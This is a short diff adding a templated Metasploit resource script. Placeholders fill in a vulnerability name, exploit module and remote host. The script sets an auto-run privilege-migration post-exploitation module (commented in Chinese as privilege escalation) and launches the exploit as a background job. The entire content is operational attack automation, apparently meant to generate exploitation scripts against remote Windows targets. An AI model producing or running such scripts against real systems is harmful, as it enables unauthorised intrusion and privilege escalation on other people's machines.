@@ -1,0 +1,6 @@
+search <%= vulnerabilityName %>
+use <%= vulnerablityModule %>
+set rhost <%= rhost %>
+set ExitOnSession false
+set AutoRunScript post/windows/manage/priv_migrate  //提权
+exploit -j
